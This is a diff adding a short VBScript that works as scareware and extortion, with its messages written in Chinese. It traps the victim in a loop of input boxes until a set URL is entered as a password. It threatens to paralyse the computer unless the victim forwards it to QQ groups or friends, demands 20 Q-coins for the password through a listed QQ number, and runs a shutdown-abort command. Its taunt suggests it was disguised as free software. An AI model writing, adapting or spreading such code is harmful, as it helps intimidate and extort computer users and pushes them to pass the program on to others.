@@ -1,0 +1,11 @@
+
+ dim a
+ do while(a <> "http://www.2345.com/?k2542152007")
+ a = inputbox ("速度转发给五个QQ群或者20个QQ好友、完事联系QQ320839297不然你也别想关掉、重启就让你开不开机，让你电脑瘫痪，不信你试试""　","加不加","对不起系统没有检测到你把软件发至五个群",8000,7000)
+ msgbox chr(13) + chr(13) + chr(13) + a,0,"哈哈！贪小便宜吃大亏。"
+ loop
+msgbox chr(13) + chr(13) + chr(13) + "哈哈！想要密码了吧，联系Q320839297，20QB给你  "
+dim WSHshell
+set WSHshell = wscript.createobject("wscript.shell")
+WSHshell.run "cmd.exe /c shutdown -a",0 ,true  
+msgbox chr(13) + chr(13) + chr(13) + "本软件由320839297制作"
